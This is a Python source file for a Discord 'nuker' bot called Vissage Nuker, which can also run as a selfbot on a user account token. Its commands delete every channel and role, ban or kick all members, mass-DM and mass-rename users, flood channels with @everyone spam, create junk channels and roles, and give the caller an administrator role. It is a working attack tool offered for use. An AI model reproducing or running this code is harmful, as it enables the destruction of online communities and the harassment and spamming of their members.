import colorama
import discord
import json
import traceback
import requests
import os
import traceback

from discord.ext import commands
from colorama import Fore

colorama.init()
os.system('cls')

version = "1.2.0"
msgs = {"info": f"{Fore.WHITE}[{Fore.CYAN}i{Fore.WHITE}]",
        "+": f"{Fore.WHITE}[{Fore.CYAN}+{Fore.WHITE}]",
        "error": f"{Fore.WHITE}[{Fore.RED}e{Fore.WHITE}]",
        "input": f"{Fore.WHITE}{Fore.CYAN}>>{Fore.WHITE}",
        "pressenter": f"{Fore.WHITE}[{Fore.CYAN}i{Fore.WHITE}] Press ENTER to exit"}


async def msg_delete(ctx):

    """
    Trying to delete activation message
    """

    try:
        await ctx.message.delete()
    except:
        print(f"{msgs['error']} Can't delete your message")


def userOrBot():
    """
    Returns True if token belongs to user's account
    Returns False if token belongs to bot's account
    """

    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return True
    else:
        return False


def checkVersion():
    """
    Checking for new versions on github
    """

    try:
        res = requests.get(
            "https://github.com/Vissage-Security-Team", timeout=2)
        if res.status_code == 200:
            response = res.json()
            git_version = response['tag_name']
            if version != git_version:
                return "(Update avaible)"
            else:
                return "(Latest)"
        else:
            return ""
    except:
        return ""
 

print(f'{Fore.RED}\n\n                 ' + "\n"
      r'                                  _                           ' + "\n"
      r'                                 (_)                          ' + "\n"
      r'                           __   ___ ___ ___  __ _  __ _  ___  ' + "\n"
      r'                           \ \ / / / __/ __|/ _` |/ _` |/ _ \ ' + "\n"
      r'                            \ V /| \__ \__ \ (_| | (_| |  __/ ' + "\n"
      r'                             \_/ |_|___/___/\__,_|\__, |\___| ' + "\n"
      r'                                                   __/ |      ' + "\n"
      r'                                                  |___/       ' + "\n"
      "\n"
      "\n"
      "\n"
      f"{Fore.RED}                           Author: {Fore.RED}Vissage\n"
      f"{Fore.RED}                           Version: {Fore.RED}{version} (Latest)\n"
      f"{Fore.RED}                           GitHub: {Fore.RED}https://github.com/vanisthevillain\n\n{Fore.WHITE}")

"""
Fetching prefix, token and owner ID's from config
If there's no config, requests data from the user and creates it
"""

try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
    token = config["token"]
    prefix = config["prefix"]
    owners = config["owners"]
    activity = config["activity"]
    print(f"{msgs['info']} Loaded config.json")
except FileNotFoundError:
    token = input(f"  Paste token {msgs['input']} ") 
    prefix = input(f" Paste prefix {msgs['input']} ")
    owners = input(
        f"Paste bot's owner ID (If several use ',') {msgs['input']} ")
    activity = ""
    owners = owners.replace(" ", "")
    if "," in owners:
        owners = owners.split(",")
        owners = list(map(int, owners))
    config = {
        "token": token,
        "prefix": prefix,
        "owners": owners,
        "activity": activity
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    print(f"{msgs['info']} Created config.json")

if activity.lower() == "none":
    activity = None
elif activity:
    activity = discord.Game(name=activity)
else:
    activity = discord.Game(name=f"Vissage Nuker v{version}")

bot = commands.Bot(command_prefix=prefix, self_bot=userOrBot(),
                   activity=activity, intents=discord.Intents.all())
bot.remove_command("help")


@bot.event
async def on_ready():
    print(f"\n\n{Fore.CYAN}" + ("═"*75).center(95) + f"\n{Fore.WHITE}" +
          f"Logged in as {bot.user}".center(95) + "\n" +
          f"Prefix: {prefix}".center(95) + "\n" +
          f"Total servers: {len(bot.guilds)}".center(95) + "\n" +
          f"Total members: {len(bot.users)} ".center(95) + f"\n{Fore.CYAN}" + ("═"*75).center(95) + f"\n\n{Fore.WHITE}")


@bot.event
async def on_command(ctx):
    print(f"{msgs['info']} Executed {ctx.command}")


@bot.event
async def on_command_error(ctx, err):
    errors = commands.errors
    if isinstance(err, errors.BadArgument) or isinstance(err, errors.PrivateMessageOnly):
        return
    elif isinstance(err, errors.MissingPermissions):
        print(f"{msgs['error']} Missing permissions")
    else:
        print(f'{Fore.RED}\n\n{"".join(traceback.format_exception(type(err), err, err.__traceback__))}{Fore.WHITE}\n')


@bot.command(name='help')
async def help(ctx):
    await msg_delete(ctx)
    p = prefix
    embed = discord.Embed(title="Help", color=0x5c92ff)
    embed.set_author(name="Vissage Nuker",
                     url="https://github.com/vanisthevillain")
    embed.add_field(
        name="Nuke", value=f"`{p}1 <ban 1/0> <your text>`", inline=False)
    embed.add_field(name="Ban everyone", value=f"`{p}2`", inline=False)
    embed.add_field(name="Kick everyone", value=f"`{p}3`", inline=False)
    embed.add_field(name="Rename everyone",
                    value=f"`{p}4 <new nickname>`", inline=False)
    embed.add_field(name="DM everyone",
                    value=f"`{p}5 <message>`", inline=False)
    embed.add_field(name="Spam to all channels",
                    value=f"`{p}6 <amount> <text>`", inline=False)
    embed.add_field(name="Spam to current channel",
                    value=f"`{p}7 <amount> <text>`", inline=False)
    embed.add_field(name="Delete all channels", value=f"`{p}`8", inline=True)
    embed.add_field(name="Delete all roles", value=f"`{p}9`", inline=True)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(name="Spam with channels",
                    value=f"`{p}10 <amount> <name>`", inline=True)
    embed.add_field(name="Spam with roles",
                    value=f"`{p}11 <amount> <name>`", inline=True)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(name="Edit server icon",
                    value=f"`{p}12`\n`Image is attachment`", inline=True)
    embed.add_field(name="Edit server name",
                    value=f"`{p}13 <name>`", inline=True)
    embed.add_field(name="Get admin",
                    value=f"`{p}14 <name of role>`", inline=False)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(
        name="Revive", value=f"`{p}15 <guild id>`\n`Creating 1 text channel on server if you deleted all`\n`Execute in DM`", inline=False)
    embed.add_field(name="\u200b\nInfo",
                    value="**Vissage Nuker**\nMade by vanis#0001\nGitHub: https://github.com/vanisthevillain\n", inline=False)
    await ctx.message.author.send(embed=embed)


@bot.command(name='1', aliases=["nk", "nuke"])
async def nuke(ctx, ban: bool = True, text: str = "Vissage Nuker"):
    await msg_delete(ctx)

    """
    Trying to change server icon and name
    """

    icon = await ctx.message.attachments[0].read() if ctx.message.attachments else None
    await ctx.guild.edit(name=text, icon=icon, banner=icon)

    """
    Trying to delete all channels
    """

    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"{msgs['+']} Deleted {ch}")
        except:
            print(f"{msgs['error']} Can't delete {ch}")

    """
    Trying to ban everyone if requested
    """

    if ban:
        for m in ctx.guild.members:
            if str(m.id) not in owners:
                try:
                    await m.ban()
                    print(f"{msgs['+']} Banned {m}")
                except:
                    print(f"{msgs['error']} can't ban {m}")
            else:
                print(f"{msgs['info']} {m} is owner")

    """
    Trying to delete roles
    """

    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} Deleted {r}")
        except:
            print(f"{msgs['error']} Can't delete {r}")


@bot.command(name='2', aliases=["be"])
async def banEveryone(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if str(m.id) not in owners:
            try:
                await m.ban()
                print(f"{msgs['+']} Banned {m}")
            except:
                print(f"{msgs['error']} can't ban {m}")
        else:
            print(f"{msgs['info']} {m} is owner")


@bot.command(name='3', aliases=["ke"])
async def kickEveryone(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if str(m.id) not in owners:
            try:
                await m.kick()
                print(f"{msgs['+']} Kicked {m}")
            except:
                print(f"{msgs['error']} can't kick {m}")
        else:
            print(f"{msgs['info']} {m} is owner")


@bot.command(name="4", aliases=["chen"])
async def renameEveryone(ctx, *, name="Vissage Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if str(m.id) not in owners:
            try:
                await m.edit(nick=name)
                print(f"{msgs['+']} Changed {m}'s nickname")
            except:
                print(f"{msgs['error']} Can't change {m}'s nickname")
        else:
            print(f"{msgs['info']} {m.name} is owner")


@bot.command(name="5", aliases=["dme"])
async def dmEveryone(ctx, *, msg="Vissage Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if str(m.id) not in owners:
            try:
                await m.send(msg)
                print(f"{msgs['+']} Message sent to {m}")
            except:
                print(f"{msgs['error']} Can't send message to {m}")
        else:
            print(f"{msgs['info']} {m.name} is owner")


@bot.command(name="6", aliases=["sa"])
async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Vissage Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        for ch in ctx.guild.channels:
            try:
                await ch.send(text)
                print(f"{msgs['+']} Message sent to {ch}")
            except:
                print(f"{msgs['error']} Can't send message to {ch}")


@bot.command(name='7', aliases=["sc"])
async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Vissage Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.channel.send(text)
            print(f"{msgs['+']} Message sent to {ctx.channel}")
        except:
            print(f"{msgs['error']} Can't send message to {ctx.channel}")


@bot.command(name='8', aliases=["dch"])
async def deleteAllChannels(ctx):
    await msg_delete(ctx)
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"{msgs['+']} Deleted {ch}")
        except:
            print(f"{msgs['error']} Can't delete {ch}")


@bot.command(name='9', aliases=["dr"])
async def deleteAllRoles(ctx):
    await msg_delete(ctx)
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} Deleted {r}")
        except:
            print(f"{msgs['error']} Can't delete {r}")


@bot.command(name="10", aliases=["sch"])
async def spamWithChannels(ctx, amount: int = 25, *, name="Vissage Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(name=name)
            print(f"{msgs['+']} Created channel")
        except:
            print(f"{msgs['error']} Can't create channel")


@bot.command(name="11", aliases=["sr"])
async def spamWithRoles(ctx, amount: int = 25, *, name="Vissage Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name)
            print(f"{msgs['+']} Created role")
        except:
            print(f"{msgs['error']} Can't create role")


@bot.command(name='12', aliases=["si"])
async def editServerIcon(ctx):
    await msg_delete(ctx)
    if ctx.message.attachments:
        icon = await ctx.message.attachments[0].read()
    else:
        return

    try:
        await ctx.guild.edit(icon=icon)
        print(f"{msgs['+']} Changed server icon")
    except:
        print(f"{msgs['error']} Can't change server icon")


@bot.command(name='13', aliases=["sn"])
async def editServerName(ctx, *, name="Vissage Nuker"):
    await msg_delete(ctx)
    try:
        await ctx.guild.edit(name=name)
        print(f"{msgs['+']} Changed server name")
    except:
        print(f"{msgs['error']} Can't change server name")


@bot.command(name="14", aliases=["ga"])
async def getAdmin(ctx, *, rolename="Vissage Nuker"):
    await msg_delete(ctx)
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(f"{msgs['+']} Added admin role to {ctx.message.author}")
    except Exception as e:
        print(f"{msgs['error']} Can't add admin role to {ctx.message.author}")


@bot.command(name='15', aliases=["rg"])
@commands.dm_only()
async def reviveGuild(ctx, guildId: int = None):
    if guildId:
        guild = bot.get_guild(guildId)
        try:
            await guild.create_text_channel(name="Vissage Nuker")
            print(f"{msgs['+']} Revived {guild}")
        except:
            print(f"{msgs['error']} Can't revive {guild}")

"""
Running bot
"""

try:
    bot.run(token, bot=not userOrBot())
except discord.errors.LoginFailure:
    print(f'{msgs["error"]} Invalid Token')
    print(msgs['pressenter'])
    input()
    os._exit(0)
except discord.errors.PrivilegedIntentsRequired:
    print(f"{msgs['error']} It looks like you didn't enable the necessary intents in the developer portal. Visit {Fore.CYAN}https://discord.com/developers/applications/ {Fore.WHITE}and turn them on.\n")
    print(msgs['pressenter'])
    input()
    os._exit(0)
except Exception as e:
    print(f'{Fore.RED}\nAn error occured while logging:\n{"".join(traceback.format_exception(type(e), e, e.__traceback__))}{Fore.WHITE}\n')
    print(msgs['pressenter'])
    input()
    os._exit(0)
